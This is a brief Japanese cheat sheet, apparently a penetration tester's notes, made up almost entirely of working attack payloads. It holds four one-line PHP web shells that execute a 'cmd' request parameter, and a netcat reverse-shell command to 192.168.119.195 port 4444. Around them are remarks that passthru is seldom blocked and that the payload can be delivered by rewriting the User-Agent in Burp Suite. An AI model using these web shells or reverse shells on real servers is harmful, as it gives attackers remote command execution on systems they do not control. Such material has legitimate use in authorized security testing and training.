```
<?php system($_GET['cmd']);?>
<?php passthru($_GET['cmd']);?>
<?php exec($_GET['cmd']);?>
<?php shell_exec($_REQUEST['cmd']);?>
```
passthruは塞がれていることが少ない   
```
passthru("nc -e /bin/sh 192.168.119.195 4444");
```
BurpSuiteでUser-Agentを書き換える
```
<? passthru("nc -e /bin/sh 192.168.119.195 4444"); ?>
```
